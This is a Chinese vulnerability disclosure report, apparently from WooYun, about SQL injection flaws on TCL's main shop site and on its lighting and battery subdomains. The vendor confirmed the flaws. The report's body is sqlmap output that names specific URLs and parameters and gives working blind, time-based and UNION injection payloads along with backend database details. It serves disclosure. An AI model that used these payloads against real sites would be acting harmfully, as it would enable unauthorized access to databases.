wybug_title: TCL官方网上商城主站SQL注入漏洞+分站多个注入
wybug_detail:
漏洞详情 披露状态：   									2014-10-17：	细节已通知厂商并且等待厂商处理中									2014-10-17：	厂商已经确认，细节仅向厂商公开									2014-10-27：	细节向核心白帽子及相关领域专家公开									2014-11-06：	细节向普通白帽子公开									2014-11-16：	细节向实习白帽子公开									2014-12-01：	细节向公众公开  简要描述：  详细说明：  http://www.tcl.com/Investors/investorslist.html?tid=1http://lighting.tcl.com/cn/news-d.aspx?ID=410&SortID=80http://battery.tcl.com/read_job.php?id=38注入一:http://www.tcl.com/Investors/investorslist.html?tid=1

sqlmap identified the following injection points with a total of 106 HTTP(s) requests:---Place: GETParameter: tid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=1 AND 8948=8948    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tid=1 AND SLEEP(5)---web application technology: Nginxback-end DBMS: MySQL 5.0.11注入二：http://battery.tcl.com/read_job.php?id=38

sqlmap identified the following injection points with a total of 181 HTTP(s) requests:---Place: GETParameter: id    Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: id=-1419 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71736c6b71,0x4a477376566e71676b6f,0x7178757371),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: id=38 AND 2184=BENCHMARK(5000000,MD5(0x6354556b))---web server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, PHP 4.3.4back-end DBMS: MySQL < 5.0.0available databases [1]:[*] battery注入三http://lighting.tcl.com/cn/news-d.aspx?ID=410&SortID=80

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=410 AND 3251=3251&SortID=80---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft Access注入四http://lighting.tcl.com/cn/resources-d.aspx?ID=401&SortID=98

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=401 AND 1544=1544&SortID=98---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft Access因为是盲注，我就不慢慢跑了。   漏洞证明：  注入一:http://www.tcl.com/Investors/investorslist.html?tid=1

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-17 11:28 厂商回复： 感谢您的关注，已转交相关单位处理。 最新状态： 暂无
